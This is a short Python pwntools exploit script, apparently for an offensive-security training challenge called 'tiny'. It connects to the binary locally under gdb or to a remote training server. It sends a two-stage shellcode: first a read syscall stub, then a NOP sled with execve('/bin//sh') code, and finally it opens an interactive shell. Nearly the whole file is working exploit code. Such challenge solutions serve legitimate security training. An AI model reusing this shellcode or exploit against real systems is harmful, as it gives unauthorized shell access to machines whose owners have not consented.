from pwn import *

from pwn import *
context.clear(arch='amd64',os='linux')

run_local = True
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/tiny')
	pid=gdb.attach(r,"""b *0x555555554d0e""")
	input("wait")
else:
	r=remote("bin.training.offdef.it",4101)

shellcode=b"\x6A\x00\x58\x6A\x00\x5F\x52\x5E\x68\xFF\x00\x00\x00\x5A\x0F\x05"
r.send(shellcode)
input("wait")

shellcode=b"\x90"*18
shellcode+=b"\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x89\xE7\x6A\x3B\x58\x99\x0F\x05"

r.send(shellcode)
r.interactive()
